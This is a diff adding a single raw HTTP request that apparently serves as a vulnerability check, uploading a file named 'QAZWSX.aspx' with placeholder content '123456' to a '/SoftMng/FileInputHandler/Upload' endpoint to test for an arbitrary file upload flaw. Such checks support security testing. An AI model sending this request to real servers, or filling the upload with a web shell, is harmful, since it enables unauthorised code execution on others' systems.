@@ -1,0 +1,16 @@
+POST /SoftMng/FileInputHandler/Upload HTTP/1.1
+Host: 
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Length: 211
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+------WebKitFormBoundaryFfJZ4PlAZBixjELj
+Content-Disposition: form-data; name="file"; filename="QAZWSX.aspx"
+Content-Type: application/octet-stream
+
+123456
+------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
